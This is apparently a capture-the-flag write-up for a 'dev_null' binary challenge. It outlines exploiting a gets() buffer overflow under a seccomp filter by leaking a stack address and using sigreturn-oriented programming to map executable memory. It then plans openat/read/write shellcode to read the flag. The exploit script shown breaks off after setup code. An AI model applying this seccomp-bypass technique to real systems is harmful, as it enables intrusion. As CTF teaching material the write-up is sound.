# Description
> A few months ago, I came across this website. Inspired by it, I decided to recreate the service in C to self-host it.
To avoid any exploitable vulnerabilities, I decided to use a very strict seccomp filter. Even if my code were vulnerable, good luck exploiting it.
PS: You can find the flag at `/home/ctf/flag.txt` on the remote server.

# Challenge Overview
The challenge involves exploiting a buffer overflow in a `non-PIE` binary with a strict `seccomp` filter. The goal is to read the flag from `/home/ctf/flag.txt` using allowed syscalls. The key steps involve leaking a stack address, crafting a `Sigreturn-Oriented Programming (SROP)` chain to create an `RWX` memory region, and executing shellcode that utilizes `openat`, `read`, and `write` syscalls.

# Binary Analysis
- Security Features: `Partial RELRO`, `Stack Canary`, `NX Enabled`, `No PIE`.
- Vulnerability: `gets()` in `dev_null()` causing a `buffer overflow`.
- Seccomp Rules: Blocks dangerous syscalls (e.g., `open`, `execve`) but allows `openat`, `read`, `write`, and `sigreturn`.

# Exploit

Looking back, this article seems to be a shellcode article because it has seccomp and although NX is enabled, we can still execute shellcode through ROP, we can use some syscalls like `mmap`, `mprotect` to grant permissions to a certain memory area. This article is special in that there are no common `gadgets` for us to execute a normal ROP chain, but instead there are `syscalls` and `pop rax`, we can immediately think of using `SROP`.

:::note
`Sigreturn-Oriented Programming (SROP)` is an exploitation technique that abuses the Linux kernel’s signal-handling mechanism. When a process receives a signal (e.g., segmentation fault), the kernel saves the process’s execution context (registers, stack, etc.) onto the stack. After handling the signal, the kernel restores the context using the sigreturn syscall. `SROP` exploits this mechanism by forging a fake signal frame on the stack and triggering sigreturn to hijack control of all registers, effectively allowing arbitrary syscalls or code execution.
:::

So the idea for this:

- Leak Stack Address: Use a ROP chain to leak `__libc_stack_end` to determine stack layout.
- `SROP` for RWX Memory: Use `SROP` to call `mmap` and create an executable memory region.
- Shellcode Execution: Inject shellcode using `openat` to open the flag, `read` it, and `write` to stdout.

## Exploit:
```py
#!/usr/bin/env python3
# -*- coding: utf-8 -*-
from pwncus import *

context.log_level = 'debug'
exe = context.binary = ELF('./dev_null', checksec=False)

def GDB(): gdb.attach(p, gdbscript='''

b*dev_null+52
c
''') if not args.REMOTE else None

if args.REMOTE:
    con = sys.argv[1:]
    p = remote(con[0], int(con[1]))
else:
    p = process(argv=[exe.path], aslr=False)

if args.GDB: GDB(); input()
